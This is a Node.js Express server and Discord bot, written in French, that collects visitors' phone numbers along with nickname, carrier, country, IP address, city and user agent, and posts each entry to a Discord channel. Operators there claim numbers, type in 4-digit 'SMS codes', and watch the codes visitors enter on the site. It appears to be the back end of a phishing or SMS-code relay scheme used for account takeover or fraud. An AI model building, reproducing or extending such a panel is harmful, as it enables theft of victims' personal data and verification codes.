require("dotenv").config();
const path = require("path");
const crypto = require("crypto");
const express = require("express");
const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require("discord.js");

const TOKEN = process.env.DISCORD_TOKEN;
const CHANNEL_ID = process.env.CHANNEL_ID;
const PING = process.env.PING || "";
const PORT = process.env.PORT || 3000;
const MAX_SESSIONS = 400;

if (!TOKEN || !CHANNEL_ID) { console.error("DISCORD_TOKEN ou CHANNEL_ID manquant"); process.exit(1); }

const sessions = new Map();
const app = express();
app.set("trust proxy", 1);
app.disable("x-powered-by");

const origins = (process.env.ALLOWED_ORIGIN || "*").split(",").map(s => s.trim());
app.use((req, res, next) => {
  const o = req.headers.origin;
  res.header("Access-Control-Allow-Origin", origins.includes("*") ? "*" : (origins.includes(o) ? o : origins[0]));
  res.header("Vary", "Origin");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Methods", "GET,POST,OPTIONS");
  res.header("X-Content-Type-Options", "nosniff");
  res.header("Referrer-Policy", "no-referrer");
  if (req.method === "OPTIONS") return res.sendStatus(204);
  next();
});
app.use(express.json({ limit: "8kb" }));
app.use(express.static(path.join(__dirname, "public"), { dotfiles: "deny" }));

const hits = new Map();
function limit(max, win) {
  return (req, res, next) => {
    const k = req.ip || "?";
    const now = Date.now();
    const arr = (hits.get(k) || []).filter(t => now - t < win);
    arr.push(now);
    hits.set(k, arr);
    if (arr.length > max) return res.status(429).json({ error: "rate" });
    next();
  };
}
setInterval(() => { const now = Date.now(); for (const [k, v] of hits) if (!v.some(t => now - t < 60000)) hits.delete(k); }, 60000);

const clean = (v, max) => String(v == null ? "" : v).replace(/[\u0000-\u001F\u007F]+/g, " ").trim().slice(0, max);
const PHONE = /^\+\d{1,3}[\d ]{6,17}$/;

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

const btn = (a, id, l, s, off) => {
  const b = new ButtonBuilder().setCustomId(a + ":" + id).setLabel(l).setStyle(s);
  if (off) b.setDisabled(true);
  return b;
};

const rows = (s) => {
  const final = s.state === "accepted" || s.state === "refused";
  if (final) return [new ActionRowBuilder().addComponents(
    btn("accept", s.id, "Accepter", ButtonStyle.Success, true),
    btn("refuse", s.id, "Refuser", ButtonStyle.Danger, true))];
  if (s.state === "code_ready" || s.state === "code_entered") return [new ActionRowBuilder().addComponents(
    btn("accept", s.id, "Accepter", ButtonStyle.Success),
    btn("refuse", s.id, "Refuser", ButtonStyle.Danger))];
  const c = s.state === "claimed";
  return [new ActionRowBuilder().addComponents(
    btn("claim", s.id, "Claim", ButtonStyle.Success, c),
    btn("unclaim", s.id, "Unclaim", ButtonStyle.Secondary, !c),
    btn("code", s.id, "Envoyer le code", ButtonStyle.Primary, !c))];
};

const STATUS = { pending: "En attente", code_ready: "Code envoyé", code_entered: "Code saisi", accepted: "Accepté", refused: "Refusé" };

function embed(s) {
  const e = new EmbedBuilder()
    .setColor(s.state === "accepted" ? 0x57F287 : 0xED4245)
    .setTitle("Vérification")
    .setDescription(s.state === "claimed" ? "**Réservé par " + s.claimedBy + "**" : "**" + STATUS[s.state] + "**")
    .setTimestamp();
  e.addFields(
    { name: "Numéro", value: "**" + s.tel + "**", inline: true },
    { name: "Pseudo", value: "**" + (s.pseudo || "—") + "**", inline: true },
    { name: "Opérateur", value: s.op || "—", inline: true },
    { name: "Pays", value: s.pays || "—", inline: true },
    { name: "IP", value: "`" + (s.ip || "—") + "`", inline: true },
    { name: "Ville", value: s.ville || "—", inline: true });
  if (s.code) e.addFields({ name: "Code envoyé", value: "**" + s.code + "**", inline: true });
  if (s.saisi) e.addFields({ name: "Code saisi", value: "**" + s.saisi + "**", inline: true });
  return e;
}

async function refresh(s) {
  try {
    const ch = await client.channels.fetch(CHANNEL_ID);
    const m = await ch.messages.fetch(s.messageId);
    await m.edit({ embeds: [embed(s)], components: rows(s) });
  } catch (e) { console.error("refresh", e.message); }
}

function prune() {
  if (sessions.size <= MAX_SESSIONS) return;
  const arr = [...sessions.values()].sort((a, b) => a.created - b.created);
  for (let i = 0; i < arr.length - MAX_SESSIONS; i++) sessions.delete(arr[i].id);
}

client.on("interactionCreate", async (i) => {
  try {
    if (!i.guildId) return;
    if (i.isButton()) {
      const [a, id] = i.customId.split(":");
      const s = sessions.get(id);
      if (!s) return i.reply({ content: "Session expirée.", ephemeral: true });

      if (a === "claim") {
        if (s.claimedBy) return i.reply({ content: "Déjà réservé par " + s.claimedBy, ephemeral: true });
        s.claimedBy = clean(i.user.username, 32);
        s.state = "claimed";
        await i.reply({ content: "Numéro réservé. Clique sur « Envoyer le code » dès que tu l'as.", ephemeral: true });
        return refresh(s);
      }
      if (a === "unclaim") {
        if (s.claimedBy !== i.user.username) return i.reply({ content: "Réservé par " + s.claimedBy + ".", ephemeral: true });
        s.claimedBy = null;
        s.state = "pending";
        await i.reply({ content: "Réservation libérée.", ephemeral: true });
        return refresh(s);
      }
      if (a === "code") {
        if (s.claimedBy !== i.user.username) return i.reply({ content: "Réservé par " + s.claimedBy + ".", ephemeral: true });
        const m = new ModalBuilder().setCustomId("modal:" + id).setTitle("Code reçu par SMS");
        m.addComponents(new ActionRowBuilder().addComponents(
          new TextInputBuilder().setCustomId("code").setLabel("Code à 4 chiffres")
            .setStyle(TextInputStyle.Short).setMinLength(4).setMaxLength(4).setRequired(true)));
        return i.showModal(m);
      }
      if (a === "accept" || a === "refuse") {
        if (s.claimedBy && s.claimedBy !== i.user.username) return i.reply({ content: "Réservé par " + s.claimedBy + ".", ephemeral: true });
        s.state = a === "accept" ? "accepted" : "refused";
        await i.reply({ content: a === "accept" ? "Accepté." : "Refusé.", ephemeral: true });
        return refresh(s);
      }
    }
    if (i.isModalSubmit()) {
      const id = i.customId.split(":")[1];
      const s = sessions.get(id);
      if (!s) return i.reply({ content: "Session expirée.", ephemeral: true });
      if (s.claimedBy !== i.user.username) return i.reply({ content: "Réservé par " + s.claimedBy + ".", ephemeral: true });
      s.code = clean(i.fields.getTextInputValue("code"), 4);
      s.state = "code_ready";
      await i.reply({ content: "Code transmis, la saisie s'affiche sur le site.", ephemeral: true });
      return refresh(s);
    }
  } catch (e) { console.error(e); }
});

app.post("/api/request", limit(8, 60000), async (req, res) => {
  const b = req.body || {};
  const tel = clean(b.tel, 24);
  if (!PHONE.test(tel)) return res.status(400).json({ error: "num" });
  const id = crypto.randomBytes(6).toString("hex");
  const s = {
    id, tel,
    pseudo: clean(b.pseudo, 40),
    op: clean(b.op, 30),
    pays: clean(b.pays, 30),
    ip: clean(b.ip, 45),
    ville: clean(b.ville, 60),
    ua: clean(b.ua, 200),
    state: "pending", created: Date.now()
  };
  sessions.set(id, s);
  prune();
  try {
    const ch = await client.channels.fetch(CHANNEL_ID);
    const msg = await ch.send({ content: PING || undefined, embeds: [embed(s)], components: rows(s) });
    s.messageId = msg.id;
    res.json({ id });
  } catch (e) { console.error(e.message); sessions.delete(id); res.status(500).json({ error: "discord" }); }
});

app.get("/api/state/:id", limit(120, 60000), (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: "expired" });
  res.json({ state: s.state });
});

app.post("/api/code/:id", limit(30, 60000), async (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: "expired" });
  s.saisi = clean((req.body || {}).code, 6);
  s.state = "code_entered";
  res.json({ ok: true });
  refresh(s);
});

app.use("/api", (req, res) => res.status(404).json({ error: "notfound" }));
app.get("*", (req, res) => res.sendFile(path.join(__dirname, "public", "index.html")));

setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now - s.created > 45 * 60 * 1000) sessions.delete(k);
}, 5 * 60 * 1000);

client.once("ready", (c) => {
  console.log("Connecté : " + c.user.tag);
  app.listen(PORT, () => console.log("Port " + PORT));
});

client.login(TOKEN);
